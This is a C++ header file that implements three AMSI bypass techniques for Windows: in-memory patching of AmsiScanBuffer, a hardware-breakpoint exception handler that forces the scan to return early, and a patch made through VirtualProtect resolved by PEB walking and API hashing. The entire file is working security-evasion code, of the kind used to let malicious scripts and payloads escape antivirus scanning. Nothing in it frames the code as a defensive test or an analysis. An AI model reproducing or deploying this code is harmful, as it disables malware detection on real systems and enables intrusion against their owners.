#pragma once

#include <Windows.h>
#include <iostream>
#include "Helpers.h"

using namespace std;


DWORD calcHash(char* data);
HMODULE GetModuleFromPEB(DWORD wModuleHash);
uintptr_t GetAPIFromPEBModule(void* hModule, DWORD ApiHash);


BOOL BypassAMSI_Patch() {
    printf("[*] Attempting AMSI bypass via memory patching...\n");


    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }


    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] Failed to find AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer found at: 0x%p\n", pAmsiScanBuffer);


    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,
        0xC3
    };


    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }


    memcpy(pAmsiScanBuffer, patch, sizeof(patch));


    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI bypassed successfully!\n");
    return TRUE;
}


static BOOL g_AmsiBypassActive = FALSE;
static PVOID g_AmsiScanBufferAddress = NULL;


LONG WINAPI AmsiExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == g_AmsiScanBufferAddress) {
            printf("[+] AMSI Hardware Breakpoint Hit!\n");


#ifdef _WIN64
            ExceptionInfo->ContextRecord->Rax = 0x80070057;
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(ExceptionInfo->ContextRecord->Rsp);
            ExceptionInfo->ContextRecord->Rsp += 8;
#else
            ExceptionInfo->ContextRecord->Eax = 0x80070057;
            ExceptionInfo->ContextRecord->Eip = *(DWORD*)(ExceptionInfo->ContextRecord->Esp);
            ExceptionInfo->ContextRecord->Esp += 4;
#endif

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL BypassAMSI_HWBP() {
    printf("[*] Attempting AMSI bypass via Hardware Breakpoint...\n");

    // Load amsi.dll
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    // Get AmsiScanBuffer address
    g_AmsiScanBufferAddress = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_AmsiScanBufferAddress) {
        printf("[-] Failed to find AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer found at: 0x%p\n", g_AmsiScanBufferAddress);

    // Register exception handler
    AddVectoredExceptionHandler(1, AmsiExceptionHandler);


    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }


    ctx.Dr0 = (DWORD_PTR)g_AmsiScanBufferAddress;


    ctx.Dr7 = 0x00000001;

    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    g_AmsiBypassActive = TRUE;
    printf("[+] AMSI Hardware Breakpoint set successfully!\n");

    return TRUE;
}



BOOL BypassAMSI_Unhooked() {
    printf("[*] Attempting AMSI bypass using unhooked ntdll...\n");


    HMODULE hKernel32 = GetModuleFromPEB(HASH_KERNEL32);
    if (!hKernel32) {
        printf("[-] Failed to get kernel32 from PEB\n");
        return FALSE;
    }


    TypeVirtualProtect VirtualProtectCustom = (TypeVirtualProtect)GetAPIFromPEBModule(hKernel32, HASH_VirtualProtect);
    if (!VirtualProtectCustom) {
        printf("[-] Failed to get VirtualProtect from PEB\n");
        return FALSE;
    }

    // Load amsi.dll
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    // Get AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] Failed to find AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer found at: 0x%p\n", pAmsiScanBuffer);


    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,
        0xC3
    };

    DWORD oldProtect;
    if (!VirtualProtectCustom(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtectCustom(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI bypassed using unhooked API!\n");
    return TRUE;
}



BOOL BypassAMSI(int method = 1) {
    printf("[*] Starting AMSI bypass...\n");

    BOOL result = FALSE;

    switch (method) {
    case 1:
        // Simple memory patching
        result = BypassAMSI_Patch();
        break;

    case 2:
        // Hardware breakpoint
        result = BypassAMSI_HWBP();
        break;

    case 3:
        // Using unhooked ntdll
        result = BypassAMSI_Unhooked();
        break;

    default:
        printf("[-] Invalid AMSI bypass method\n");
        return FALSE;
    }

    if (result) {
        printf("[+] AMSI bypass completed successfully!\n");
    }
    else {
        printf("[-] AMSI bypass failed!\n");
    }

    return result;
}


